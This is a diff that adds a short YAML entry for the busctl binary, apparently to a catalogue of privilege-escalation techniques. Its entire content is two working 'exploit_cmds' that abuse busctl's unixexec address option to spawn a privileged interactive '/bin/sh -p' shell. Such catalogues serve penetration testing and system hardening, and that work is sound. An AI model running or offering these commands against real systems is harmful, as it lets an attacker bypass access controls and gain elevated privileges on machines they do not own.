@@ -1,0 +1,8 @@
+name: busctl
+binary_path: /usr/bin/busctl
+exploit_cmds:
+- /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1
+  org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh
+  -p -i 0<&2 1>&2'
+- /usr/bin/busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2
+  1>&2'
